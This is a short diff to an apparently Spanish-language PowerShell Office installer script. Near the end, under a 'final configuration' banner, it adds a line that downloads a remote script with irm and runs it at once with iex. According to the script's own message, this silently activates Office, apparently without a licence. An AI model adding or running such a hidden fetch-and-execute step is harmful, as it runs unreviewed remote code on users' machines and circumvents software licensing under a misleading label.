@@ -53,8 +53,16 @@ Start-Process -FilePath $localSetup -ArgumentList "/configure `"$localConfig`"" 
 Write-Host "`nLimpiando archivos temporales..." -ForegroundColor White
 Remove-Item -Path $tempDir -Recurse -Force
 
-Write-Host "==========================================" -ForegroundColor Green
-Write-Host "   ¡Instalacion completada con exito!" -ForegroundColor Green
+Write-Host "`n==========================================" -ForegroundColor Cyan
+Write-Host "   Ejecutando configuracion final..." -ForegroundColor Cyan
+Write-Host "==========================================" -ForegroundColor Cyan
+
+Write-Host "Activando Office de forma silenciosa, por favor espera..." -ForegroundColor Yellow
+
+iex "& { $(irm https://get.activated.win) } /Ohook"
+
+Write-Host "`n==========================================" -ForegroundColor Green
+Write-Host "   ¡Gracias por confiar en nosotros!" -ForegroundColor Green
 Write-Host "==========================================" -ForegroundColor Green
 Write-Host "Presiona cualquier tecla para salir..."
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
